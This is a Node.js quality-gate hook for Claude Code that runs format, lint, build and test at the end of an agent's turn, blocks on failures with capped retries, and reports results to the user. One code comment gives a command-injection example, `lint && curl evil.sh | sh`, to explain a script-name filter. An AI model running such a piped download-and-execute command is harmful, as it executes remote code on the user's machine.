#!/usr/bin/env node

// why: the agent may read, search and explore the repo freely - what it must not do is end the
// task leaving lint/build/test broken. That is why the gate runs on the Stop event and ONLY
// when something changed inside the watched paths (default: src). Asking a question or
// browsing the code triggers no build at all.
//
// hazard: a Stop gate is a loop by construction - it blocks the end of the turn and the agent
// goes back to work. Every stop control (attempts, time budget, block cap) exists so that this
// loop ALWAYS ends, with a report, instead of trapping the agent. Claude Code has a cap of its
// own: after 8 consecutive blocks it ignores the hook and ends the turn. MAX_BLOCKS (default 6)
// sits below that on purpose, so the hook gives up with a report before the runtime gives up
// without explaining anything.

import { spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const DEFAULT_PATHS = 'src';
const DEFAULT_FORMAT = 'format';
const DEFAULT_COMMANDS = 'lint,build,test';
const DEFAULT_MAX_ATTEMPTS = '3';
const DEFAULT_BUDGET_SEC = '900';
const DEFAULT_COMMAND_TIMEOUT_SEC = '300';
const DEFAULT_MAX_BLOCKS = '6';
const DEFAULT_NOTIFY = 'always';

// why: scanning node_modules/dist/coverage to decide "what changed" would cost more than
// running the build - and nothing there is source edited by the agent.
const SKIP_DIRS = new Set([
  'node_modules',
  '.git',
  'dist',
  'build',
  'out',
  'coverage',
  '.next',
  '.turbo',
  '.cache',
]);

const MAX_FINGERPRINT_FILES = 20000;
const REASON_MAX_CHARS = 7000;
const DETAIL_MAX_LINES = 30;
const DETAIL_MAX_CHARS = 1400;
const STATE_TTL_MS = 24 * 60 * 60 * 1000;

// why: the user writes the path as `/src`, `./src` or `src\` - all three mean the same folder
// of the repo. Normalizing here keeps the "right" config from matching nothing.
function normalizeRelPath(value) {
  return String(value)
    .replace(/\\/g, '/')
    .replace(/^\.\//, '')
    .replace(/^\/+/, '')
    .replace(/\/+$/, '');
}

function parseList(value) {
  return String(value)
    .split(',')
    .map((item) => item.trim())
    .filter(Boolean);
}

function parseNumber(value, fallback) {
  const parsed = Number.parseFloat(String(value));
  return Number.isFinite(parsed) && parsed >= 0 ? parsed : Number.parseFloat(fallback);
}

// why: there is no per-hook `env` field in the Claude Code settings.json. The configuration
// therefore arrives as a command line argument (`args`, exec form, with no shell in between),
// and the env var still counts as the second option - it is what the selftests use.
function flagValue(name) {
  const prefix = `--${name}=`;
  const hit = process.argv.slice(2).find((arg) => arg.startsWith(prefix));
  return hit === undefined ? undefined : hit.slice(prefix.length);
}

// hazard: `??` all the way through, never `||` - an empty value (`--commands=`) has to mean
// "run no verification at all", and not "fall back to the default".
function setting(flag, envName, fallback) {
  return flagValue(flag) ?? process.env[envName] ?? fallback;
}

const PATHS = parseList(setting('paths', 'VERIFY_CHANGES_PATHS', DEFAULT_PATHS)).map(
  normalizeRelPath,
);
const FORMAT_SCRIPT = String(setting('format', 'VERIFY_CHANGES_FORMAT', DEFAULT_FORMAT)).trim();
const COMMANDS = parseList(setting('commands', 'VERIFY_CHANGES_COMMANDS', DEFAULT_COMMANDS));
const MAX_ATTEMPTS = parseNumber(
  setting('max-attempts', 'VERIFY_CHANGES_MAX_ATTEMPTS', DEFAULT_MAX_ATTEMPTS),
  DEFAULT_MAX_ATTEMPTS,
);
const BUDGET_MS =
  parseNumber(
    setting('budget-sec', 'VERIFY_CHANGES_BUDGET_SEC', DEFAULT_BUDGET_SEC),
    DEFAULT_BUDGET_SEC,
  ) * 1000;
const COMMAND_TIMEOUT_MS =
  parseNumber(
    setting(
      'command-timeout-sec',
      'VERIFY_CHANGES_COMMAND_TIMEOUT_SEC',
      DEFAULT_COMMAND_TIMEOUT_SEC,
    ),
    DEFAULT_COMMAND_TIMEOUT_SEC,
  ) * 1000;
const MAX_BLOCKS = parseNumber(
  setting('max-blocks', 'VERIFY_CHANGES_MAX_BLOCKS', DEFAULT_MAX_BLOCKS),
  DEFAULT_MAX_BLOCKS,
);
// `always` = reports on every end of turn, including when nothing ran; `on-run` = only when
// some command ran; `on-error` = only when it failed.
const NOTIFY = String(setting('notify', 'VERIFY_CHANGES_NOTIFY', DEFAULT_NOTIFY)).trim();
const STATE_DIR = setting(
  'state-dir',
  'VERIFY_CHANGES_STATE_DIR',
  path.join(os.tmpdir(), 'claude-verify-changes'),
);

// --- fingerprint of the watched paths -------------------------------------------------------

function walk(dir, out) {
  if (out.length > MAX_FINGERPRINT_FILES) return out;
  let entries;
  try {
    entries = fs.readdirSync(dir, { withFileTypes: true });
  } catch {
    return out;
  }
  for (const entry of entries.sort((a, b) => (a.name < b.name ? -1 : 1))) {
    const full = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      if (!SKIP_DIRS.has(entry.name)) walk(full, out);
    } else if (entry.isFile()) {
      out.push(full);
    }
  }
  return out;
}

// why: a hash of CONTENT, not of mtime. `format` rewrites files and touches the mtime without
// changing anything semantic - with mtime the hook would trigger itself in a loop after every
// formatting run.
function fingerprint(cwd, relPaths) {
  const hash = createHash('sha1');
  let files = 0;
  for (const rel of relPaths) {
    const abs = path.resolve(cwd, rel);
    let stat = null;
    try {
      stat = fs.statSync(abs);
    } catch {
      hash.update(`${rel}:absent\n`);
      continue;
    }
    const list = stat.isDirectory() ? walk(abs, []) : [abs];
    for (const file of list) {
      files += 1;
      const key = path.relative(cwd, file).split(path.sep).join('/');
      try {
        hash.update(`${key}:${createHash('sha1').update(fs.readFileSync(file)).digest('hex')}\n`);
      } catch {
        hash.update(`${key}:unreadable\n`);
      }
    }
  }
  return { hash: hash.digest('hex'), files };
}

// why: a fallback for a resumed session (or a hook installed mid-session), when there is no
// sessionStart baseline. After the first round the baseline exists and git gets out of the way.
function gitDirty(cwd, relPaths) {
  const proc = spawnSync('git', ['status', '--porcelain', '--', ...relPaths], {
    cwd,
    encoding: 'utf8',
    shell: false,
    timeout: 15000,
  });
  if (proc.error || proc.status !== 0 || typeof proc.stdout !== 'string') return null;
  return proc.stdout.trim() !== '';
}

// --- per-session state -----------------------------------------------------------------------

// hazard: the key is the CWD, never the sessionId - verified on 2026-09-15. The agentStop
// `sessionId` sometimes arrives carrying the tool call id (`call_S2a2584krvQiQjfrF3TS7dnA`)
// instead of the session id. With it in the key, the state spreads across several files: the
// sessionStart baseline becomes invisible (and every end of turn falls back to git, running the
// whole suite for nothing) and the attempt counter never goes past 1 - which is what produced
// "attempt 1 of 3" three times in a row.
function stateFileOf(_sessionId, cwd) {
  const key = createHash('sha1').update(String(cwd)).digest('hex').slice(0, 16);
  return path.join(STATE_DIR, `${key}.json`);
}

function emptyState() {
  return {
    baseline: null,
    attempts: 0,
    blocks: 0,
    spentMs: 0,
    failing: false,
    pendingReport: false,
    disarmedReported: false,
    errorReported: false,
    updatedAt: Date.now(),
  };
}

function loadState(file) {
  try {
    const parsed = JSON.parse(fs.readFileSync(file, 'utf8'));
    return { ...emptyState(), ...parsed };
  } catch {
    return emptyState();
  }
}

// why: it returns whether it REALLY wrote. The "only once" notices (gate disarmed, hook broken)
// depend on the mark surviving to the next end of turn - if the disk refused, blocking again
// would repeat the notice every turn. Whoever cannot write the mark does not block.
function saveState(file, state) {
  try {
    fs.mkdirSync(path.dirname(file), { recursive: true });
    fs.writeFileSync(file, JSON.stringify({ ...state, updatedAt: Date.now() }));
    return true;
  } catch {
    // hazard: without state the hook still works - it only loses the attempt count and starts
    // depending on the runtime cap. Failing here would block the turn over a disk detail.
    return false;
  }
}

function pruneState() {
  try {
    const now = Date.now();
    for (const name of fs.readdirSync(STATE_DIR)) {
      const file = path.join(STATE_DIR, name);
      if (now - fs.statSync(file).mtimeMs > STATE_TTL_MS) fs.rmSync(file, { force: true });
    }
  } catch {
    // the directory does not exist yet, or there is nothing to clean up
  }
}

// --- running the commands --------------------------------------------------------------------

function packageScripts(cwd) {
  try {
    const parsed = JSON.parse(fs.readFileSync(path.join(cwd, 'package.json'), 'utf8'));
    return parsed && typeof parsed.scripts === 'object' && parsed.scripts !== null
      ? parsed.scripts
      : {};
  } catch {
    return null;
  }
}

function stripNoise(text) {
  return String(text ?? '')
    .replace(/\r\n/g, '\n')
    .replace(/\[[0-9;]*[A-Za-z]/g, '')
    .trimEnd();
}

function tail(text) {
  const clean = stripNoise(text);
  if (clean === '') return '';
  let out = clean.split('\n').slice(-DETAIL_MAX_LINES).join('\n');
  if (out.length > DETAIL_MAX_CHARS) out = `...${out.slice(-DETAIL_MAX_CHARS)}`;
  return out;
}

// hazard: the script name comes from env (`VERIFY_CHANGES_COMMANDS`) and is concatenated into a
// shell line. Without this sieve, a name such as `lint && curl evil.sh | sh` would turn into
// execution - and npm never had a script with those characters, so restricting costs nothing.
const SCRIPT_NAME = /^[A-Za-z0-9][A-Za-z0-9:_.-]*$/;

function runScript(script, cwd, timeoutMs) {
  const started = Date.now();
  // hazard: `shell: true` with an args array is deprecated in Node 24 (DEP0190) because the
  // args are not escaped, only concatenated - passing the ready-made line is the supported
  // path. And the shell is mandatory: on Windows `npm` is a .cmd and a direct spawn fails with
  // EINVAL.
  const proc = spawnSync(`npm run ${script}`, {
    cwd,
    encoding: 'utf8',
    shell: true,
    timeout: Math.max(1000, timeoutMs),
    maxBuffer: 20 * 1024 * 1024,
    env: { ...process.env, CI: '1', FORCE_COLOR: '0', NO_COLOR: '1', NODE_NO_WARNINGS: '1' },
  });
  const durationMs = Date.now() - started;
  const output = `${stripNoise(proc.stdout)}\n${stripNoise(proc.stderr)}`.trim();

  if (proc.error && (proc.error.code === 'ETIMEDOUT' || proc.signal)) {
    return { script, status: 'timeout', durationMs, output, exit: null };
  }
  if (proc.error) {
    return { script, status: 'error', durationMs, output: proc.error.message, exit: null };
  }
  if (proc.status !== 0) {
    return { script, status: 'failed', durationMs, output, exit: proc.status };
  }
  return { script, status: 'ok', durationMs, output, exit: 0 };
}

function verify(cwd, state) {
  const scripts = packageScripts(cwd);
  if (scripts === null) return null;

  // why: `format` comes first so the final result already matches the project style - running
  // it after the lint would only produce a second diff to check.
  const planned = [FORMAT_SCRIPT, ...COMMANDS].filter(Boolean);
  const results = [];
  let spentMs = 0;

  for (const script of planned) {
    // why: the requirement is to run ALL of them and report each one - it does not stop at the
    // first error, otherwise the agent discovers the failures one per turn.
    if (!SCRIPT_NAME.test(script)) {
      results.push({ script, status: 'invalid', durationMs: 0, output: '', exit: null });
      continue;
    }
    if (!Object.prototype.hasOwnProperty.call(scripts, script)) {
      results.push({ script, status: 'missing', durationMs: 0, output: '', exit: null });
      continue;
    }
    const remainingMs = BUDGET_MS - state.spentMs - spentMs;
    if (remainingMs <= 0) {
      results.push({ script, status: 'skipped', durationMs: 0, output: '', exit: null });
      continue;
    }
    const result = runScript(script, cwd, Math.min(COMMAND_TIMEOUT_MS, remainingMs));
    spentMs += result.durationMs;
    results.push(result);
  }

  return { results, spentMs };
}

// --- report ----------------------------------------------------------------------------------

function seconds(ms) {
  return `${(ms / 1000).toFixed(1)}s`;
}

function describe(result) {
  switch (result.status) {
    case 'ok':
      return `OK (${seconds(result.durationMs)})`;
    case 'failed':
      return `FAILED exit ${result.exit} (${seconds(result.durationMs)})`;
    case 'timeout':
      return `TIMEOUT after ${seconds(result.durationMs)}`;
    case 'error':
      return 'FAILED TO START the process';
    case 'missing':
      return `NOT RUN: the script "${result.script}" does not exist in package.json`;
    case 'skipped':
      return 'NOT RUN: the verification time budget is exhausted';
    case 'invalid':
      return `NOT RUN: "${result.script}" is not a valid npm script name (hook config)`;
    default:
      return String(result.status);
  }
}

// why: a missing script is NOT a failure - the requirement is not to block the agent over it,
// only to report it. A timeout and a spawn error, on the other hand, are failures: the command
// exists and did not pass.
function isBlocking(result) {
  return result.status === 'failed' || result.status === 'timeout' || result.status === 'error';
}

function summaryTable(results) {
  const width = Math.max(...results.map((result) => result.script.length));
  return results
    .map((result) => `  npm run ${result.script.padEnd(width)}  ->  ${describe(result)}`)
    .join('\n');
}

function details(results) {
  return results
    .filter(isBlocking)
    .map((result) => {
      const excerpt = tail(result.output);
      return `--- output of \`npm run ${result.script}\` ---\n${excerpt === '' ? '(no output)' : excerpt}`;
    })
    .join('\n\n');
}

function buildReason(head, results, guidance) {
  const parts = [head, summaryTable(results), details(results), guidance].filter(
    (part) => part !== '',
  );
  const reason = parts.join('\n\n');
  if (reason.length <= REASON_MAX_CHARS) return reason;
  // hazard: a huge reason can be truncated by the runtime from the END - and the end is exactly
  // the instruction of what to do. It cuts the middle (the outputs) and preserves the header
  // plus the guidance.
  return [head, summaryTable(results), '(outputs omitted for size)', guidance].join('\n\n');
}

const NO_CHEATING =
  'Do not disable a lint rule, do not skip a test, do not use ts-ignore/any and do not change a ' +
  'configuration file (eslint/jest/prettier/tsconfig) to make it pass - fix the code.';

function fixGuidance(attempt) {
  return (
    'What to do now: fix the failures above and only then end the turn - this verification runs ' +
    `again on its own at the next end of turn. ${NO_CHEATING} This is attempt ${attempt} of ` +
    `${MAX_ATTEMPTS}; once the attempts are exhausted the hook stops blocking and you will have ` +
    'to report the remaining failures to the user.'
  );
}

const FINAL_GUIDANCE =
  'What to do now: STOP trying to fix it - the verification attempt/time limit has been reached ' +
  'and this hook will not block again. End the turn now and, in your final answer to the user, ' +
  'on top of the normal answer, state in plain text: (1) every verification that ran in this ' +
  'step and the result of each one, (2) the ones that failed, with the reason, (3) the ones that ' +
  'did not run because the script does not exist in package.json, (4) what stays pending because ' +
  'of that. The human decides the next step.';

const SUCCESS_GUIDANCE =
  'What to do now: there is nothing to fix. End the turn now and, in your final answer to the ' +
  'user, on top of the normal answer, include this report: every verification that ran in this ' +
  'step with its result, and the ones that did not run because the script does not exist in ' +
  'package.json.';

// why: the user wants to know at EVERY end of turn whether the verification ran or not -
// silence is ambiguous (there is no way to tell "nothing to verify" from "the hook is not
// loaded"). That is why the "did not run" notice is short and tells the agent NOT to redo
// anything: it costs one line, not a turn of work.
// why: disarming quietly is the worst possible silence - from then on nothing is verified, and
// the session looks identical to one where everything passed. The user needs to know the safety
// net is gone.
function disarmedNotice() {
  return [
    `[verify-changes] Verification status for this end of turn: the gate DISARMED ITSELF after ` +
      `${MAX_BLOCKS} blocks in this session. From now on no end of turn will be verified ` +
      'automatically.',
    'What to do now: do not redo anything. End the turn telling the user, in one line, that the ' +
      'gate disarmed itself and that lint/build/test are NO LONGER being verified at this point ' +
      'of the session - for a guarantee they have to run the commands by hand or open a new session.',
  ].join('\n\n');
}

// why: same logic - a hook that broke is indistinguishable from a hook that approved. Since the
// hook itself is faulty, the notice goes out ONCE and after that it stays quiet for good.
function errorNotice(detail) {
  return [
    `[verify-changes] Verification status for this end of turn: the hook BROKE and ran nothing ` +
      `- ${detail}.`,
    'What to do now: do not redo anything and do not try to fix the hook on your own. End the ' +
      'turn telling the user, in one line, that the automatic verification failed with an ' +
      'internal error and that lint/build/test were NOT run at this end of turn.',
  ].join('\n\n');
}

function skipNotice(detail) {
  const planned = [FORMAT_SCRIPT, ...COMMANDS].filter(Boolean);
  return [
    `[verify-changes] Verification status for this end of turn: NO command was run - ${detail}.`,
    planned.length > 0
      ? `Commands that would run if something had changed: npm run ${planned.join(', npm run ')}.`
      : '',
    'What to do now: do not redo anything, do not repeat the previous answer and do not run those ' +
      'commands on your own. Just end the turn adding ONE short status line for the user, in the ' +
      'format: "Verifications: none run - <reason above>."',
  ]
    .filter((part) => part !== '')
    .join('\n\n');
}

// --- decision --------------------------------------------------------------------------------

// hazard: a double decide() would emit two JSON objects on the same stdout and the runtime
// would read the first one (or neither). Every decision output goes through here and only the
// first one counts.
let decided = false;

function emitBlock(reason) {
  if (decided) return;
  decided = true;
  // why: on Stop, `{ decision: 'block', reason }` goes at the TOP of the object - it is the only
  // one of the four hooks whose decision does not live inside `hookSpecificOutput`.
  //
  // hazard: exit 0 goes along with it. On Stop, exit 2 also blocks, but then the message comes
  // from stderr and the turn is marked as a hook error; with exit 0 the `reason` reaches the
  // agent clean.
  process.stdout.write(`${JSON.stringify({ decision: 'block', reason })}\n`);
}

// why: allow while leaving a trace, instead of going quiet. Silence is indistinguishable from a
// dead hook, a crash and a timeout, and `systemMessage` makes the debug log record that the hook
// ran, looked and decided to allow - which is the trace that was missing to debug "the hook did
// nothing".
//
// hazard: `{ decision: 'allow' }` does NOT exist in the Stop schema: the object fails validation
// and the turn picks up a "hook error" warning for nothing. On Stop, allowing is simply not
// sending `decision`.
//
// hazard: the note goes in `systemMessage`, never in `reason` nor in `additionalContext`. The
// latter two CONTINUE the conversation in Claude Code, so a diagnostic text would turn into work
// for the agent; `systemMessage` on Stop only goes to the debug log.
function emitAllow(note) {
  if (decided) return;
  decided = true;
  const payload = note ? { systemMessage: `[verify-changes] ${note}` } : {};
  process.stdout.write(`${JSON.stringify(payload)}\n`);
}

function onSessionStart(payload) {
  const cwd = payload.cwd ?? process.cwd();
  const sessionId = payload.sessionId ?? payload.session_id ?? 'unknown';
  pruneState();

  // why: the baseline is born here. Without it, a repo that is already dirty (the normal case)
  // would turn every question into a build - exactly the annoyance this hook must avoid.
  const state = emptyState();
  state.baseline = fingerprint(cwd, PATHS).hash;
  saveState(stateFileOf(sessionId, cwd), state);

  const planned = [FORMAT_SCRIPT, ...COMMANDS].filter(Boolean);
  if (PATHS.length === 0 || planned.length === 0) return;

  // hazard: in Claude Code the SessionStart `additionalContext` lives INSIDE
  // `hookSpecificOutput`. At the top of the object it fails schema validation and the notice
  // never reaches the agent - it would start the session without knowing a gate exists at the
  // end of the turn.
  process.stdout.write(
    `${JSON.stringify({
      hookSpecificOutput: {
        hookEventName: 'SessionStart',
        additionalContext:
          `[verify-changes] If this session changes anything in ${PATHS.join(', ')}, before the ` +
          `turn ends the following will run automatically: npm run ${planned.join(', npm run ')}. ` +
          'A failure there blocks the end of the turn until you fix it, so write the code already ' +
          'formatted, free of lint/type errors and with the tests passing.',
      },
    })}\n`,
  );
}

function onAgentStop(payload) {
  const cwd = payload.cwd ?? process.cwd();
  const sessionId = payload.sessionId ?? payload.session_id ?? 'unknown';
  const file = stateFileOf(sessionId, cwd);
  const state = loadState(file);

  if (PATHS.length === 0 || (COMMANDS.length === 0 && FORMAT_SCRIPT === '')) {
    emitAllow('gate turned off by configuration (empty PATHS or COMMANDS)');
    return;
  }

  // hazard: `stop_hook_active` is the only loop signal that does NOT depend on the state file.
  // If the runtime says this turn was already forced to continue and our counter is at zero, the
  // state was lost mid-cycle (tmp cleaned, new sessionId) - and counting from zero again would
  // stack our blocks on top of the ones the runtime already granted, pushing toward the cap of 8.
  const stopHookActive = payload.stop_hook_active === true || payload.stopHookActive === true;
  if (stopHookActive && state.blocks === 0) {
    state.blocks = Math.max(0, MAX_BLOCKS - 1);
    saveState(file, state);
  }

  // hazard: an absolute block cap. Any bug in the attempt counting stops here, so the hook's
  // worst case is "it gives up", never "it traps the agent".
  if (state.blocks >= MAX_BLOCKS) {
    // why: disarming costs ONE block more than the cap (7 by default against the runtime's 8),
    // because disarming without a notice leaves the session looking verified when it no longer is.
    if (!state.disarmedReported) {
      state.disarmedReported = true;
      if (saveState(file, state)) {
        emitBlock(disarmedNotice());
        return;
      }
    }
    emitAllow(`cap of ${MAX_BLOCKS} blocks reached in this session; the gate is disarmed`);
    return;
  }

  // hazard: `justReported` is what keeps the "nothing ran" notice from feeding itself - without
  // it, the turn that delivers the notice triggers another notice, and so on until MAX_BLOCKS.
  const justReported = state.pendingReport === true;
  if (justReported) {
    // why: the previous turn was spent delivering the report to the user - that request has been
    // fulfilled already, and it cannot become a reason to block again.
    state.pendingReport = false;
    saveState(file, state);
  }

  // why: a single exit point for the "did not run" cases - that way no silent path escapes the
  // notice, which is exactly what the user cannot tell apart from a dead hook.
  const notifySkip = (detail) => {
    if (NOTIFY !== 'always' || justReported) {
      emitAllow(`no command was run: ${detail}`);
      return;
    }
    state.pendingReport = true;
    state.blocks += 1;
    saveState(file, state);
    emitBlock(skipNotice(detail));
  };

  const current = fingerprint(cwd, PATHS);
  const changed =
    state.baseline === null ? (gitDirty(cwd, PATHS) ?? true) : current.hash !== state.baseline;

  // why: `failing` keeps the gate standing when the agent ends the turn WITHOUT fixing anything -
  // without it, merely stopping editing would be enough to escape the verification that just
  // failed.
  if (!changed && !state.failing) {
    if (state.baseline === null) state.baseline = current.hash;
    saveState(file, state);
    notifySkip(`nothing changed in ${PATHS.join(', ')} since the session started`);
    return;
  }

  const run = verify(cwd, state);
  if (run === null) {
    // with no readable package.json there is nothing to verify
    notifySkip('the package.json at the project root could not be read');
    return;
  }

  state.spentMs += run.spentMs;
  // why: a post-run baseline - `format` has just rewritten files, and that must not count as
  // "the agent touched things again" at the next end of turn.
  state.baseline = fingerprint(cwd, PATHS).hash;

  const failed = run.results.filter(isBlocking);

  if (failed.length === 0) {
    state.failing = false;
    state.attempts = 0;
    state.pendingReport = NOTIFY !== 'on-error';
    state.blocks += state.pendingReport ? 1 : 0;
    saveState(file, state);
    if (!state.pendingReport) {
      emitAllow('verification ran with no failures; report omitted because of NOTIFY=on-error');
      return;
    }
    emitBlock(
      buildReason(
        `[verify-changes] Verification status for this end of turn: RAN (changes in ` +
          `${PATHS.join(', ')}), with NO failures:`,
        run.results,
        SUCCESS_GUIDANCE,
      ),
    );
    return;
  }

  state.attempts += 1;
  const outOfBudget = state.spentMs >= BUDGET_MS;
  const exhausted = state.attempts >= MAX_ATTEMPTS || outOfBudget;
  state.failing = !exhausted;
  state.pendingReport = exhausted;
  state.blocks += 1;
  saveState(file, state);

  const head = exhausted
    ? '[verify-changes] Verification status for this end of turn: RAN and still WITH FAILURES ' +
      `after ${state.attempts} attempt(s)` +
      `${outOfBudget ? ' and with the time budget exhausted' : ''} - the hook stops blocking here:`
    : `[verify-changes] Verification status for this end of turn: RAN (changes in ` +
      `${PATHS.join(', ')}), WITH FAILURES (attempt ${state.attempts} of ${MAX_ATTEMPTS}):`;

  emitBlock(
    buildReason(head, run.results, exhausted ? FINAL_GUIDANCE : fixGuidance(state.attempts)),
  );
}

function eventOf(payload) {
  // why: the same script serves two events. Claude Code's `hook_event_name` is the source of
  // truth; `--event=` still applies for manual runs and for the selftests.
  const name = String(payload.hook_event_name ?? payload.hookEventName ?? '').toLowerCase();
  if (name === 'sessionstart') return 'sessionStart';
  if (name === 'stop' || name === 'subagentstop' || name === 'agentstop') return 'agentStop';
  const flag = process.argv.find((arg) => arg.startsWith('--event='));
  if (flag) return flag.slice('--event='.length);
  // why: SessionStart carries `reason` (startup/resume/clear/...). Some runtimes use `source`
  // instead; either of them, with no event name, can only be the start of a session.
  if (payload.reason !== undefined || payload.source !== undefined) return 'sessionStart';
  return 'agentStop';
}

async function readStdin() {
  const chunks = [];
  for await (const chunk of process.stdin) chunks.push(Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

// hazard: process.exit() can truncate stdout on Windows - the script never calls it, it only
// sets exitCode and lets Node flush the decision JSON.
// why: kept outside the try so the catch knows in which project the hook broke - without the cwd
// there is no way to find the state and the failure notice would repeat at every end of turn.
let lastPayload = null;

try {
  const raw = (await readStdin()).trim();
  if (raw !== '') {
    let payload = null;
    try {
      payload = JSON.parse(raw);
    } catch {
      payload = null;
    }
    lastPayload = payload;
    if (payload !== null && typeof payload === 'object') {
      if (eventOf(payload) === 'sessionStart') onSessionStart(payload);
      else onAgentStop(payload);
    } else {
      // hazard: unlike preToolUse (fail-closed), here an unreadable payload ALLOWS - without
      // knowing what ran there is no basis to demand a fix, and blocking the turn over it would
      // be worse than not having the gate.
      emitAllow('unreadable Stop payload; the end of turn was allowed without verification');
    }
  }
} catch (error) {
  const detail = `${error?.name ?? 'Error'}: ${error?.message ?? ''}`;

  // why: a broken hook is indistinguishable from a hook that approved - and the user thinks they
  // are covered when they are not. So the failure turns into a notice through the agent, ONCE
  // per session.
  try {
    const file = stateFileOf(null, lastPayload?.cwd ?? process.cwd());
    const state = loadState(file);
    // hazard: it only blocks if the mark was REALLY written. If the fault is on the disk itself,
    // repeating the notice at every end of turn would turn the failure into a loop.
    if (!state.errorReported) {
      state.errorReported = true;
      if (saveState(file, state)) emitBlock(errorNotice(detail));
    }
  } catch {
    // the state is unusable; what is left is the silent fail-open below
  }

  // hazard: Stop is fail-open on purpose. If the hook itself breaks, it GETS OUT OF THE WAY -
  // a buggy quality gate must not keep the agent from delivering the answer. This emitAllow is a
  // no-op when the notice above has already decided.
  emitAllow(
    `internal hook failure (${detail}); the end of turn went ahead without verification. Tell ` +
      'the human to review .claude/hooks/verify-changes/verify-changes.mjs',
  );
}

process.exitCode ??= 0;
